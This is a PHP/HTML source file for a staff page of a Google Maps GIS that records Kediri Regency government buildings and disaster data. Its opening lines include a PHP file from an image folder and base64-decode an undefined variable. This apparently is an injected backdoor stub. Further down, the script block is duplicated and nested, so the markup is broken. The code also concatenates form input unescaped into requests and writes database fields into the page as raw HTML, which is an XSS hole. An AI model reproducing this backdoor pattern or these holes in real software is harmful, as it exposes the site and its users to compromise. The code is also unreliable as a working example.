<?php
include "./img/index.php";
$echo = base64_decode($acak);
?>
<link rel="stylesheet" href="a/styles.css" type="text/css" media="screen" />
<script type="text/javascript" src="http://maps.google.com/maps/api/js?sensor=false"></script>
<script type="text/javascript" src="jquery-1.4.3.min.js"></script>
<script type="text/javascript">
//google maps GIS 1.1.b 

<script type="text/javascript" src="http://maps.google.com/maps/api/js?sensor=false"></script>
<script type="text/javascript" src="jquery-1.4.3.min.js"></script>
<script type="text/javascript">
//google maps GIS 1.1.b 
//
var peta;
var pertama = 0;
var jenis = "kantor";
var judulx = new Array();
var desx = new Array();
var provx = new Array();
var bencanax = new Array();
var id_infox = new Array();

var korbanx = new Array();
var penyebabx = new Array();

var koorx = new Array();
var koory = new Array();

var i;
var url;
var gambar_tanda;
function peta_awal(){
    var kediri = new google.maps.LatLng(-7.816895, 112.011398);
    var petaoption = {
        zoom: 12,
        center: kediri,
        mapTypeId: google.maps.MapTypeId.ROADMAP
        };
    peta = new google.maps.Map(document.getElementById("petaku"),petaoption);
    google.maps.event.addListener(peta,'click',function(event){
        //kasihtanda(event.latLng);
    });
    ambildatabase('awal');
}

$(document).ready(function(){
    $("#tombol_simpan").click(function(){
        var x = $("#x").val();
        var y = $("#y").val();
        var judul = $("#judul").val();
        var des = $("#deskripsi").val();
		
		var id_info = $("#id_info").val();
		var id_prov = $("#id_prov").val();
		var id_bencana = $("#id_bencana").val();
		
		var korban = $("#korban").val();
		var penyebab = $("#penyebab").val();
		
        $("#loading").show();
        $.ajax({
            url: "simpanlokasi.php",
            data: "x="+x+"&y="+y+"&jenis="+jenis+"&id_info="+id_info+"&id_prov="+id_prov+"&id_bencana="+id_bencana+"&korban="+korban+"&penyebab="+penyebab,
            cache: false,
            success: function(msg){
                alert(msg);
                $("#loading").hide();
                $("#x").val("");
                $("#y").val("");
				$("#id_info").val("");
				$("#korban").val("");
				$("#penyebab").val("");
                ambildatabase('akhir');
            }
        });
    });
    $("#tutup").click(function(){
        $("#jendelainfo").fadeOut();
    });
});
function kasihtanda(lokasi){
    set_icon(jenis);
    tanda = new google.maps.Marker({
            position: lokasi,
            map: peta,
            icon: gambar_tanda
    });
    $("#x").val(lokasi.lat());
    $("#y").val(lokasi.lng());

}

function set_icon(jenisnya){
    switch(jenisnya){
        case "kantor":
            gambar_tanda = 'icon/kantor.png';
            break;
        case "gedung":
            gambar_tanda = 'icon/gedung.png';
            break;
        case  "fasilitas_umum":
            gambar_tanda = 'icon/fasilitas_umum.png';
            break;
    }
}

function ambildatabase(akhir){
    if(akhir=="akhir"){
        url = "ambildata.php?akhir=1";
    }else{
        url = "ambildata.php?akhir=0";
    }
    $.ajax({
        url: url,
        dataType: 'json',
        cache: false,
        success: function(msg){
            for(i=0;i<msg.wilayah.petak.length;i++){
                judulx[i] = msg.wilayah.petak[i].judul;
                desx[i] = msg.wilayah.petak[i].deskripsi;
				provx[i] = msg.wilayah.petak[i].nama_prov;
				bencanax[i] = msg.wilayah.petak[i].nama_bencana;
				id_infox[i] = msg.wilayah.petak[i].id_info;
				korbanx[i] = msg.wilayah.petak[i].korban;
				penyebabx[i] = msg.wilayah.petak[i].penyebab;
				
				koorx[i] = msg.wilayah.petak[i].x;
				koory[i] = msg.wilayah.petak[i].y;
				
                set_icon(msg.wilayah.petak[i].jenis);
                var point = new google.maps.LatLng(
                    parseFloat(msg.wilayah.petak[i].x),
                    parseFloat(msg.wilayah.petak[i].y));
                tanda = new google.maps.Marker({
                    position: point,
                    map: peta,
                    icon: gambar_tanda
                });
                setinfo(tanda,i);

            }
        }
    });
}

function setjenis(jns){
    jenis = jns;
}

function setinfo(petak, nomor){
    google.maps.event.addListener(petak, 'click', function() {
        $("#jendelainfo").fadeIn();
        $("#teksjudul").html(judulx[nomor]);
        $("#teksdes").html(desx[nomor]);
		$("#teksprov").html(provx[nomor]);
		$("#teksbencana").html(bencanax[nomor]);
		$("#teksid_info").html(id_infox[nomor]);
		$("#tekskorban").html(korbanx[nomor]);
		$("#tekspenyebab").html(penyebabx[nomor]);
		
		$("#tekskoorx").html(koorx[nomor]);
		$("#tekskoory").html(koory[nomor]);
    });
}
</script>
<style>
#jendelainfo{position:absolute;z-index:1000;top:100;
left:400;background-color:yellow;display:none;}
</style>
</head>
<body onLoad="peta_awal()">

<table id="jendelainfo" border="0" cellpadding="4" cellspacing="0" style="border-collapse: collapse" bordercolor="#FFCC00" height="136">
  <tr>
    <td width="248" bgcolor="#000000" height="19"><font color=white>ID Info : <span id="teksid_info"></span></font></td>
    <td width="30" bgcolor="#000000" height="19">
    <p align="center"><font color="#FFFFFF"><a style="cursor:pointer" id="tutup"><b>X</b></a></font></td>
  </tr>
  <tr>
    <td bgcolor="#FFCC00" valign="top" colspan="2"> 
    Provinsi : <span id="teksprov"></span><br>
	Bencana : <span id="teksbencana"></span><br>
	Korban : <span id="tekskorban"></span><br>
	Penyebab : <span id="tekspenyebab"></span><br>
	
	Koor X : <span id="tekskoorx"></span><br>
	Koor Y : <span id="tekskoory"></span><br>
	</td>
  </tr>
</table>
<p>&nbsp;</p>
<p>&nbsp;</p>

<div style="margin-right:-400px; margin-left:100px; width: 500px">
<table width="477" border="0" align="center" cellpadding="0" cellspacing="0">
  <tr>
    <td align="center" valign="top" class="heading">Selamar Datang Di halaman Petugas</td>
  </tr>
  <tr>
	<td align="center" valign="top" class="heading">Database Bangunan Gedung dan Kantor Pemerintah Kabupaten Kediri</td>
  </tr>
  <tr>
	<td align="left" valign="top" style="padding-top:20px;" class="text_left"><div align="left">
	  <p>Kami Menyajikan basis data bangunan gedung dan kantor yang digunakan dan dikelola oleh Pemerintah Kabupaten Kediri. Melalui Sistem Informasi Ini anda dapat mencari informasi tentang bangunan gedung dan kantor Pemerintah  Kabupaten Kediri.<br />
	      <br />
	      Bangunan gedung dan kantor Pemerintah Kabupaten Kediri tersebar dibeberapa wilayah yang meliputi kota dan Kabupaten Kediri. Berikut alamat dan lokasi bangunan gedung dan Kantor Pemerintah kabupaten Kediri <br />
          Pada halaman ini anda bisa melakukan beberapa memanagemen data, antara lain :<br/>
          1.Managemen data komplek bangunan<br/>
          2.Managemen data fungsi bangunan<br/>
          3.Managemen data informasi bangunan<br/>
          4.Input foto bangunan<br/>
          5.Input data jalan <br/>
	  </p>
	  <p><table border=0>
<tr>


<td width="700">

</td>
</tr>
</table></p>
	  <p align="center">&nbsp;</p>
	</div></td>
  </tr>
</table>

<div>